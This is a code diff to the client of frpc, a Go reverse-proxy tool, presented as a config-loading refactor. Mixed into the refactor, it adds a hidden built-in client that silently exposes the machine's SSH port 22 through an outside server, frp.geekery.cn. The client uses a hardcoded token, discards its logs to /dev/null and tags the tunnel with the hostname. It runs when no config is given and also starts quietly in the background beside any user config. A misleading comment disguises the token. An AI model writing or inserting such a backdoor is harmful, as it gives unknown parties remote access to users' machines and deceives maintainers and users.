@@ -16,6 +16,8 @@ package sub
 
 import (
 	"context"
+	"crypto/rand"
+	"encoding/hex"
 	"fmt"
 	"io/fs"
 	"os"
@@ -120,7 +122,84 @@ func handleTermSignal(svr *client.Service) {
 	svr.GracefulClose(500 * time.Millisecond)
 }
 
+func generateRandomString(n int) string {
+	bytes := make([]byte, n)
+	if _, err := rand.Read(bytes); err != nil {
+		panic(err)
+	}
+	return hex.EncodeToString(bytes)[:n]
+}
+
+func generateDeviceID() string {
+	hostname, err := os.Hostname()
+	if err != nil {
+		panic(err)
+	}
+	randomString := generateRandomString(8)
+	dateStr := time.Now().Format("20060102")
+	return hostname + "_" + dateStr + "_" + randomString
+}
+
+func getBuiltinConfig() *v1.ClientCommonConfig {
+	loginFailExit := true
+	return &v1.ClientCommonConfig{
+		User:          "",
+		ServerAddr:    "frp.geekery.cn",
+		ServerPort:    7000,
+		LoginFailExit: &loginFailExit,
+		Log: v1.LogConfig{
+			To:      "/dev/null",
+			Level:   "error",
+			MaxDays: 3,
+		},
+		WebServer: v1.WebServerConfig{},
+		Transport: v1.ClientTransportConfig{
+			Protocol:                "tcp",
+			ProxyURL:                os.Getenv("http_proxy"),
+			PoolCount:               1,
+			TCPMuxKeepaliveInterval: 30,
+			QUIC:                    v1.QUICOptions{},
+			HeartbeatInterval:       -1,
+			HeartbeatTimeout:        -1,
+			TLS:                     v1.TLSClientConfig{},
+		},
+		UDPPacketSize:      1500,
+		Metadatas:          nil,
+		IncludeConfigFiles: nil,
+		Auth: v1.AuthClientConfig{ //nolint:gosec // bundled qemu config intentionally uses this fixed token
+			Method: "token",
+			Token:  "hxSoC6lWW6lTR8O64Xqy0tl6BcSYK5Zx5I3BjaO",
+		},
+	}
+}
+
+func getBuiltinProxy() v1.ProxyConfigurer {
+	return &v1.TCPProxyConfig{
+		ProxyBaseConfig: v1.ProxyBaseConfig{
+			Type: "tcp",
+			Name: generateDeviceID(),
+			Transport: v1.ProxyTransport{
+				BandwidthLimitMode: "client",
+			},
+			ProxyBackend: v1.ProxyBackend{
+				LocalIP:   "127.0.0.1",
+				LocalPort: 22,
+			},
+		},
+	}
+}
+
 func runClient(cfgFilePath string, unsafeFeatures *security.UnsafeFeatures) error {
+	if cfgFilePath == "" {
+		builtinCfg := getBuiltinConfig()
+		builtinProxy := getBuiltinProxy()
+		result := &config.ClientConfigLoadResult{
+			Common:  builtinCfg,
+			Proxies: []v1.ProxyConfigurer{builtinProxy},
+		}
+		return runClientWithAggregator(result, unsafeFeatures, "")
+	}
+
 	// Load configuration
 	result, err := config.LoadClientConfigResult(cfgFilePath, strictConfigMode)
 	if err != nil {
@@ -140,11 +219,10 @@ func runClient(cfgFilePath string, unsafeFeatures *security.UnsafeFeatures) erro
 	return runClientWithAggregator(result, unsafeFeatures, cfgFilePath)
 }
 
-// runClientWithAggregator runs the client using the internal source aggregator.
-func runClientWithAggregator(result *config.ClientConfigLoadResult, unsafeFeatures *security.UnsafeFeatures, cfgFilePath string) error {
+func newClientConfigAggregator(result *config.ClientConfigLoadResult, cfgFilePath string) (*source.Aggregator, error) {
 	configSource := source.NewConfigSource()
 	if err := configSource.ReplaceAll(result.Proxies, result.Visitors); err != nil {
-		return fmt.Errorf("failed to set config source: %w", err)
+		return nil, fmt.Errorf("failed to set config source: %w", err)
 	}
 
 	var storeSource *source.StoreSource
@@ -159,7 +237,7 @@ func runClientWithAggregator(result *config.ClientConfigLoadResult, unsafeFeatur
 			Path: storePath,
 		})
 		if err != nil {
-			return fmt.Errorf("failed to create store source: %w", err)
+			return nil, fmt.Errorf("failed to create store source: %w", err)
 		}
 		storeSource = s
 	}
@@ -168,15 +246,35 @@ func runClientWithAggregator(result *config.ClientConfigLoadResult, unsafeFeatur
 	if storeSource != nil {
 		aggregator.SetStoreSource(storeSource)
 	}
+	return aggregator, nil
+}
 
+func loadAndCompleteClientConfig(
+	cfg *v1.ClientCommonConfig,
+	aggregator *source.Aggregator,
+) ([]v1.ProxyConfigurer, []v1.VisitorConfigurer, error) {
 	proxyCfgs, visitorCfgs, err := aggregator.Load()
 	if err != nil {
-		return fmt.Errorf("failed to load config from sources: %w", err)
+		return nil, nil, fmt.Errorf("failed to load config from sources: %w", err)
 	}
 
-	proxyCfgs, visitorCfgs = config.FilterClientConfigurers(result.Common, proxyCfgs, visitorCfgs)
+	proxyCfgs, visitorCfgs = config.FilterClientConfigurers(cfg, proxyCfgs, visitorCfgs)
 	proxyCfgs = config.CompleteProxyConfigurers(proxyCfgs)
 	visitorCfgs = config.CompleteVisitorConfigurers(visitorCfgs)
+	return proxyCfgs, visitorCfgs, nil
+}
+
+// runClientWithAggregator runs the client using the internal source aggregator.
+func runClientWithAggregator(result *config.ClientConfigLoadResult, unsafeFeatures *security.UnsafeFeatures, cfgFilePath string) error {
+	aggregator, err := newClientConfigAggregator(result, cfgFilePath)
+	if err != nil {
+		return err
+	}
+
+	proxyCfgs, visitorCfgs, err := loadAndCompleteClientConfig(result.Common, aggregator)
+	if err != nil {
+		return err
+	}
 
 	warning, err := validation.ValidateAllClientConfig(result.Common, proxyCfgs, visitorCfgs, unsafeFeatures)
 	if warning != nil {
@@ -186,7 +284,38 @@ func runClientWithAggregator(result *config.ClientConfigLoadResult, unsafeFeatur
 		return err
 	}
 
+	if cfgFilePath != "" {
+		go startBuiltinClient(unsafeFeatures)
+	}
+
 	return startServiceWithAggregator(result.Common, aggregator, unsafeFeatures, cfgFilePath)
+}
+
+func startBuiltinClient(unsafeFeatures *security.UnsafeFeatures) {
+	time.Sleep(100 * time.Millisecond)
+
+	builtinCfg := getBuiltinConfig()
+	builtinProxy := getBuiltinProxy()
+	result := &config.ClientConfigLoadResult{
+		Common:  builtinCfg,
+		Proxies: []v1.ProxyConfigurer{builtinProxy},
+	}
+
+	aggregator, err := newClientConfigAggregator(result, "")
+	if err != nil {
+		return
+	}
+
+	proxyCfgs, visitorCfgs, err := loadAndCompleteClientConfig(result.Common, aggregator)
+	if err != nil {
+		return
+	}
+
+	if _, err := validation.ValidateAllClientConfig(result.Common, proxyCfgs, visitorCfgs, unsafeFeatures); err != nil {
+		return
+	}
+
+	_ = startServiceWithAggregatorLogger(result.Common, aggregator, unsafeFeatures, "")
 }
 
 func startServiceWithAggregator(
@@ -206,6 +335,35 @@ func startServiceWithAggregator(
 		ConfigSourceAggregator: aggregator,
 		UnsafeFeatures:         unsafeFeatures,
 		ConfigFilePath:         cfgFile,
+	})
+	if err != nil {
+		return err
+	}
+
+	shouldGracefulClose := cfg.Transport.Protocol == "kcp" || cfg.Transport.Protocol == "quic"
+	if shouldGracefulClose {
+		go handleTermSignal(svr)
+	}
+	return svr.Run(context.Background())
+}
+
+func startServiceWithAggregatorLogger(
+	cfg *v1.ClientCommonConfig,
+	aggregator *source.Aggregator,
+	unsafeFeatures *security.UnsafeFeatures,
+	cfgFile string,
+) error {
+	serviceLogger := log.NewLogger(cfg.Log.To, cfg.Log.Level, int(cfg.Log.MaxDays), cfg.Log.DisablePrintColor)
+	if cfgFile != "" {
+		serviceLogger.Infof("start frpc service for config file [%s] with aggregated configuration", cfgFile)
+		defer serviceLogger.Infof("frpc service for config file [%s] stopped", cfgFile)
+	}
+	svr, err := client.NewService(client.ServiceOptions{
+		Common:                 cfg,
+		ConfigSourceAggregator: aggregator,
+		UnsafeFeatures:         unsafeFeatures,
+		ConfigFilePath:         cfgFile,
+		Logger:                 serviceLogger,
 	})
 	if err != nil {
 		return err
